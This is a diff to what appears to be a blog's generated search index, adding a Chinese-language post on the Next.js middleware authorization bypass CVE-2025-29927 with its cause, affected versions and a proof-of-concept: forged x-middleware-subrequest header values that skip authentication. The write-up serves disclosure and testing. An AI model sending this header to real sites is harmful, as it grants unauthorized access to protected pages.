@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Next.js 中间件权限绕过漏洞(CVE-2025-29927)</title>
+      <link href="/2025/03/31/22/"/>
+      <url>/2025/03/31/22/</url>
+      
+        <content type="html"><![CDATA[<h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">该漏洞成因是框架中用于标记中间件递归请求的特殊请求头x-middleware-subrequest可被用户伪造，</span><br><span class="line">导致中间件处理链被绕过，进而影响基于中间件实现的身份认证、重定向等关键安全逻辑。</span><br></pre></td></tr></table></figure><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11.1.4 &lt; Next.js ≤ 13.5.6  </span><br><span class="line">14.0 &lt; Next.js &lt; 14.2.25  </span><br><span class="line">15.0 &lt; Next.js &lt; 15.2.3</span><br></pre></td></tr></table></figure><h4 id="验证POC（添加特定请求头即可绕过验证进入登录后的界面）"><a href="#验证POC（添加特定请求头即可绕过验证进入登录后的界面）" class="headerlink" title="验证POC（添加特定请求头即可绕过验证进入登录后的界面）"></a>验证POC（添加特定请求头即可绕过验证进入登录后的界面）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware  </span><br><span class="line">或者  </span><br><span class="line">x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware</span><br></pre></td></tr></table></figure><p><img src="/2025/03/31/22/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250331235042.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> POC_By_Bbdolt </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Next.js 框架 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Apache Tomcat远程代码执行漏洞(CNVD-2025-04973)</title>
       <link href="/2025/03/30/21/"/>
       <url>/2025/03/30/21/</url>
@@ -396,9 +421,9 @@
             
             <tag> Reverse </tag>
             
-            <tag> 网鼎杯 </tag>
-            
             <tag> IDA </tag>
+            
+            <tag> 网鼎杯 </tag>
             
             <tag> Ponce </tag>
             
